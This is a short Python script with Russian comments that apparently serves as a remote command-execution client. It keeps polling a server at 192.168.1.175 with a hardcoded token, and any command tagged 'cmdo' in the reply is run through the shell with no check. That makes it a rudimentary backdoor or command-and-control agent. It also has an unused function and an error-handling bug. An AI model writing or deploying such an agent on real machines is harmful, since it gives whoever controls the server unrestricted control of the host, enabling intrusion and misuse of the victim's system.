import asyncio
import subprocess
import time
import requests


async def fun1(x):
    print(x**2)
    await asyncio.sleep(3)
    print('fun1 завершена')


async def poling():
    while 1:
        link = f'http://192.168.1.175:9566/pull/pc0'
        # print(requests.get(link).json())
        # # print(download_config('l'))
        l = requests.post(link, data={'token': 'nvw2ztjjv9y5'}).json()['token']
        print(l)
        for i in l:
            c = i[1].split(',') 
            if c[0] == 'cmdo':
                await cmdo(c[1])
        await asyncio.sleep(1)


async def main():
    task1 = asyncio.create_task(poling())

    await task1

async def cmdo(com):  # output от выполнения команды в cmd
        try:
            res = subprocess.check_output(com, shell=True)
        except Exception as e:
            pass
        try:
            res = res.decode('utf8')
        except:
            try:
                res = res.decode('cp866')
            except Exception as e:
                pass
        print('Успешно:\n' + res)


asyncio.run(main())

